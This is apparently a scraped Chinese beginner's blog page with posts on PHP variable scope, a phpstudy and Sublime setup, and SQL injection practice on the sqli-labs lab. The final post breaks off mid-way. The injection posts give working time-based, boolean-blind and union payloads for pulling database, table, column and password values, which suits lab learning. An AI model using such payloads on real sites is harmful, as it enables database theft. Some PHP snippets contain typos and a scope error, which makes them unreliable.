-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $x=<span class="number">4</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"x的值是:$x"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   test();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这样子运行之后输出的会是单纯的<strong>x的值是:</strong>，而不会出现x的值。<br><img src="https://img-blog.csdnimg.cn/20200327212305326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这时就需要用到<strong>global</strong>了。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $x=<span class="number">4</span>;</span><br><span class="line">  fuction test()&#123;</span><br><span class="line">   <span class="keyword">global</span> $x;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"x的值是:$x"</span>;</span><br><span class="line">&#125;</span><br><span class="line">  test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>而执行之后就会出现<br><img src="https://img-blog.csdnimg.cn/20200327212932520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这就是<strong>global</strong>的作用。<br>在PHP中，所有全局变量存储在一个名为 $GLOBALS[index] 的数组中，因此可以在函数中调用这个数组来进行对全局变量的访问。（index记录变量的名称）<br>所以上面的代码可以写为：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x=<span class="number">4</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> $GLOBALS[<span class="string">'x'</span>];</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2020032723031049.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>static</strong><br>在PHP中，通常一个函数被调用完之后，他的变量会被删除，而如果你不想他被删除的话，可以在开始处用<strong>static</strong>来修饰一下。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $x;</span><br><span class="line">  fuction test()&#123;</span><br><span class="line">  <span class="keyword">static</span> $y=<span class="number">4</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"y的值是:$y"</span>;</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这样在这个函数被调用之后，y的值仍能一直保持为4，不过注意，y用static修饰过之后仍然是局部变量。<br><strong>参数的作用域</strong><br>参数是通过调用代码将值传递给函数的局部变量。参数是在参数列表中声明的，作为函数声明的一部分。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fuction test()&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"x的值是:$x"</span>;</span><br><span class="line">&#125;</span><br><span class="line">test(<span class="number">6</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这样子输出的结果就是<br><img src="https://img-blog.csdnimg.cn/20200327214030169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这次的学习就到这里了，下次学到东西了再记录，总的感觉还是学到了很多的 加油吧！</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/03/27/%E5%88%A9%E7%94%A8phpstudy%E9%9B%86%E6%88%90%E7%8E%AF%E5%A2%83%EF%BC%8Bsublime%E5%88%9B%E5%BB%BAPHP%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/03/27/%E5%88%A9%E7%94%A8phpstudy%E9%9B%86%E6%88%90%E7%8E%AF%E5%A2%83%EF%BC%8Bsublime%E5%88%9B%E5%BB%BAPHP%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83/" class="post-title-link" itemprop="url">利用phpstudy集成环境＋sublime创建PHP编译环境</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-03-27 23:19:53 / Modified: 23:20:01" itemprop="dateCreated datePublished" datetime="2020-03-27T23:19:53+08:00">2020-03-27</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>前言：最近开始学习PHP语言了，而学习这种语言需要apache、编译器、php环境这三个条件。一个phpstudy集成环境就很好的解决了这个问题。俗话说工欲善其事必先利其器，而我的电脑上刚好还有PHP study和sublime这两个强大的工具，何不利用一下？</p>
-<h2 id="PHP语言"><a href="#PHP语言" class="headerlink" title="PHP语言"></a>PHP语言</h2><p>先说个无关的，从我的理解方面来介绍一下PHP语言。<br><strong>PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言。</strong><br><strong>PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言。</strong><br><strong>PHP 脚本在服务器上执行。<br>   PHP 可免费下载使用。</strong><br><strong>PHP语言可以用来制作一些动态网页</strong><br>所谓动态网页，就是说网页的内容可以随着时间，环境或者数据库的操作来进行变化。</p>
-<h2 id="PHP-study的设置"><a href="#PHP-study的设置" class="headerlink" title="PHP study的设置"></a>PHP study的设置</h2><p><img src="https://img-blog.csdnimg.cn/20200327091855186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>打开软件，更改一下版本，我选择的是图中的版本，其他版本的应该也可以的。<br><strong>添加环境变量</strong><br>在phpstudy文件夹里找到你的这个版本的文件夹，然后在计算机环境变量里面添加，要注意变量是添加到下面的path变量里。<br><img src="https://img-blog.csdnimg.cn/20200327092308511.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200327092407736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>将你刚才复制的路径添加进去，然后就是确定，确定，确定。<br>设置完成，如果不放心，可以验证一下。打开DOS命令窗口，输入php -v。<br>出现的版本号是你之前选的那个就可以了。<br><strong>Sublime的使用</strong><br>首先打开sublime。按图所示进行创建。<br><img src="https://img-blog.csdnimg.cn/20200327092936675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>创建完成后，文件里会出现一些东西，然后全部删除，输入下面的代码（从某位大佬里复制过来的）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;   </span><br><span class="line">    <span class="string">"cmd"</span>: [<span class="string">"php"</span>, <span class="string">"$file"</span>],  </span><br><span class="line">    <span class="string">"file_regex"</span>: <span class="string">"php$"</span>,   </span><br><span class="line">    <span class="string">"selector"</span>: <span class="string">"source.php"</span>   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>完成之后保存，文件名为php.sublime-build<br>之后重启软件，选择PHP。如图<br><img src="https://img-blog.csdnimg.cn/20200327100901583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>接着就可以进行编写了。在软件右下角有一个Plain Text，点击更换为php就行了。<br>然后输入你的php代码，ctrl+B测试一下就可以了。<br><img src="https://img-blog.csdnimg.cn/20200327101125398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样就可以了。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/03/25/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E7%9A%84%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/03/25/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">时间盲注的学习</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-03-25 10:53:57 / Modified: 10:54:04" itemprop="dateCreated datePublished" datetime="2020-03-25T10:53:57+08:00">2020-03-25</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="时间盲注的条件"><a href="#时间盲注的条件" class="headerlink" title="时间盲注的条件"></a>时间盲注的条件</h2><p>之前已经学习过了<strong>布尔盲注</strong>，其实<strong>时间盲注</strong>和<strong>布尔盲注</strong>基本上一样，只不过布尔盲注<strong>有回显</strong>，而时间盲注<strong>没有</strong>，其实时间盲注可以解决多种方法的盲注问题。</p>
-<h2 id="学习时间盲注需要用到的函数"><a href="#学习时间盲注需要用到的函数" class="headerlink" title="学习时间盲注需要用到的函数"></a>学习时间盲注需要用到的函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sleep()/延迟函数</span><br><span class="line"><span class="keyword">if</span>(condition,<span class="keyword">true</span>,<span class="keyword">false</span>)<span class="comment">//若条件为真 执行true，若条件为假 执行false</span></span><br><span class="line">substring(<span class="string">"string"</span>,strart,length)</span><br></pre></td></tr></table></figure>
-<h2 id="时间盲注的实例"><a href="#时间盲注的实例" class="headerlink" title="时间盲注的实例"></a>时间盲注的实例</h2><p><strong>在这里就用sqli-labs的第10关讲一下</strong><br><strong>首先判断注入点</strong><br>输入代码<br><code>http://localhost/sqli-labs-master/Less-10/?id=1&quot; and sleep(10) --+</code><br>发现会延迟10秒出现结果，说明注入点时”。<br><strong>判断数据库长度</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and if(length(database())&gt;5,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
-<p><strong>接着爆出数据库名</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
-<p>接着就更改1的值来爆出来名字。<br><strong>爆表名</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
-<p>和上面的一样，更改limit 0，1的值来爆出来名字。<br><strong>和布尔盲注相比就是多了一个if的函数，其他的基本一样。</strong><br><strong>爆字段</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and if((ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))))&gt;100,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
-<p><strong>爆值</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
-<p>到这里就爆出来了，可以用脚本来进行爆破，由于技术原因就不展示了。<br>奈何本人技术差，一纯手工注入走天下，将来进行脚本学习再补回来。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/03/07/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%88%9D%E4%BD%93%E9%AA%8C/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/03/07/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%88%9D%E4%BD%93%E9%AA%8C/" class="post-title-link" itemprop="url">布尔盲注初体验</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-03-07 20:42:02" itemprop="dateCreated datePublished" datetime="2020-03-07T20:42:02+08:00">2020-03-07</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-03-20 10:16:17" itemprop="dateModified" datetime="2020-03-20T10:16:17+08:00">2020-03-20</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="上次进行了联合查询注入学习，这次进入了布尔盲注的学习，继续加油吧！"><a href="#上次进行了联合查询注入学习，这次进入了布尔盲注的学习，继续加油吧！" class="headerlink" title="上次进行了联合查询注入学习，这次进入了布尔盲注的学习，继续加油吧！"></a>上次进行了联合查询注入学习，这次进入了布尔盲注的学习，继续加油吧！</h2><h2 id="了解布尔盲注"><a href="#了解布尔盲注" class="headerlink" title="了解布尔盲注"></a>了解布尔盲注</h2><p><strong>布尔盲注的条件</strong><br>布尔盲注在注入时不会显示具体的信息，即没有显示位，只会返回对或者错误。<br><strong>布尔盲注需要用到的几个函数</strong></p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">length</span>()函数可返回字符串的长度</span><br><span class="line"><span class="selector-tag">substring</span>()函数可以截取字符串，可指定开始的位置和截取的长度</span><br><span class="line"><span class="selector-tag">ord</span>()函数可以返回单个字符的<span class="selector-tag">ASCII</span>码</span><br><span class="line"><span class="selector-tag">char</span>()函数可将<span class="selector-tag">ASCII</span>码转换为对应的字符</span><br></pre></td></tr></table></figure>
-<p>在上面ord()也可以用ascii()来代替，效果一样。</p>
-<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><strong>1、判断注入点</strong><br><img src="https://img-blog.csdnimg.cn/20200307194458832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入” or 1=1#时显示正确，删除”时出现错误，说明闭合符号是 “ 。<br><strong>判断数据库长度</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">" or length(database7())&gt;1 #</span></span><br></pre></td></tr></table></figure>
-<p>显示正确<br><img src="https://img-blog.csdnimg.cn/20200307195132807.png" alt="在这里插入图片描述">接着就依次判断，发现最后长度为10.<br><strong>爆数据库长度</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">" or ascii(substr((database()),1,1))&gt;65#</span></span><br><span class="line"><span class="string">?id=1"</span> <span class="keyword">or</span> ord(substr((database()),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">65</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<p>上面两种都可以用。用纯手工的注入的话，需要一个一个判断，很麻烦，所以可以利用brup进行爆破，再往上就是利用脚本了。本人技术很菜，所以就说一下怎样用brup进行爆破吧。<br><strong>利用brup进行爆破</strong><br><img src="https://img-blog.csdnimg.cn/20200307200514302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先进行抓包，然后将包发送到intruder中<br><img src="https://img-blog.csdnimg.cn/20200307200639616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后设置变量，由于变量是两个，所以需要用第四个进行爆破。<br><img src="https://img-blog.csdnimg.cn/2020030720100865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>两个都设置为Numbers型的，然后第一个从1开始，到10，依次增加1，第二个从0开始 依次增加1，到127结束。设置完成后就可以进行爆破了。<br><img src="https://img-blog.csdnimg.cn/20200307201640539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后只需要观察选出正确值就行了。<br>接下来就是爆出表名</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;65#</span></span><br></pre></td></tr></table></figure>
-<p>接着进行上面的爆破步骤就可以爆出来了。<br>通过修改 limit 0,1的值就可以爆出来不同的数据表名了。其中，limit 0，1指的是从第一列开始取一个值。<br><strong>爆字段和值</strong><br>爆字段</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">" or (ascii(substr((select column_name from information_schema.columns where table_name='user_1' limit 0,1),1,1)))&gt;1#</span></span><br></pre></td></tr></table></figure>
-<p>爆值</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">" or (ascii(substr((select password from user_1 limit 0,1),1,1)))&gt;1#</span></span><br></pre></td></tr></table></figure>
-<h2 id="接着把brup爆破出来的数值转换一下就可以得到了。"><a href="#接着把brup爆破出来的数值转换一下就可以得到了。" class="headerlink" title="接着把brup爆破出来的数值转换一下就可以得到了。"></a>接着把brup爆破出来的数值转换一下就可以得到了。</h2>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/02/29/sqli-labs%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/02/29/sqli-labs%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">sqli-labs学习sql注入</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-02-29 19:48:11" itemprop="dateCreated datePublished" datetime="2020-02-29T19:48:11+08:00">2020-02-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-03-20 10:16:19" itemprop="dateModified" datetime="2020-03-20T10:16:19+08:00">2020-03-20</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="sqli-labs的安装和配置"><a href="#sqli-labs的安装和配置" class="headerlink" title="sqli-labs的安装和配置"></a>sqli-labs的安装和配置</h2><h2 id="在大佬的指导下进行了对sql注入的初步了解，特写博客来记录一下第一次时遇到的问题。"><a href="#在大佬的指导下进行了对sql注入的初步了解，特写博客来记录一下第一次时遇到的问题。" class="headerlink" title="在大佬的指导下进行了对sql注入的初步了解，特写博客来记录一下第一次时遇到的问题。"></a>在大佬的指导下进行了对sql注入的初步了解，特写博客来记录一下第一次时遇到的问题。</h2><p>下载sqli-labs和phpstudy(注意PHP study版本不能高于8.0，不然容易出错，本人就是PHP study版本高了，一直出错)<br>下载完成后将sqli-labs解压放在PHP study的WWW文件夹下<br><img src="https://img-blog.csdnimg.cn/20200225152738529.png" alt="在这里插入图片描述"><br>打开sqli-labs-master\sql-connections，在里面有一个db-creds.inc文档，打开编辑<br><img src="https://img-blog.csdnimg.cn/20200225153013271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9iG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一般默认用户名、密码都是root，更改过的话输入自己更改后的就行。接下来浏览器输入<a href="http://localhost/sqli-labs-master打开" target="_blank" rel="noopener">http://localhost/sqli-labs-master打开</a><br><img src="https://img-blog.csdnimg.cn/20200225153308153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Setup/reset Database for labs<br><img src="https://img-blog.csdnimg.cn/20200225153517725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>出现这个就代表成功了。</p>
-<h2 id="联合查询注入法"><a href="#联合查询注入法" class="headerlink" title="联合查询注入法"></a>联合查询注入法</h2><p><strong>在sql注入时应该记住的一些东西<br>information_schema库存放了所有库的信息<br>information_schema.columns包含了所有表的字段<br>table_name表名<br>table_schema数据库名<br>column_name列名<br>information_schema.tables包含所有库的表名<br>group_concat()函数能将相同的行组合起来，省老事了。</strong></p>
-<p><strong>联合查询注入的原理</strong><br>联合查询注入的前提就是要有显示位(通过查询从数据库返回到页面的内容)。<br>因本人为萌新一枚，在这里就以sqli-labs（一）为例子进行说明。<br>打开网站，进入Lesson 1<br><img src="https://img-blog.csdnimg.cn/20200228192549167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>1、判断注入点</strong><br>闭合符号一般是’、”或者没有闭合符号，而注释符号一般是”) 和 –+<br>在搜索框内输入?id=1’，发现提示错误。<br><img src="https://img-blog.csdnimg.cn/20200228193234290.png" alt="在这里插入图片描述"><br>用注释符号–+注释后发现正常</p>
-<p><img src="https://img-blog.csdnimg.cn/20200228193407902.png" alt="在这里插入图片描述"><br>说明注入点是单引号’<br><strong>2、判断列数</strong><br>在输入框内输入id=1,,2,3;时，均有不同的数据返回。然后输入</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//http://localhost/sqli-labs-master/Less-1/?id=1' order by 4 --+</span></span><br></pre></td></tr></table></figure>
-<p>发现<br><img src="https://img-blog.csdnimg.cn/20200228193828695.png" alt="在这里插入图片描述"><br>说明一共有三列<br><strong>3、联合查询开始</strong><br>输入</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-1/?id=0' union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
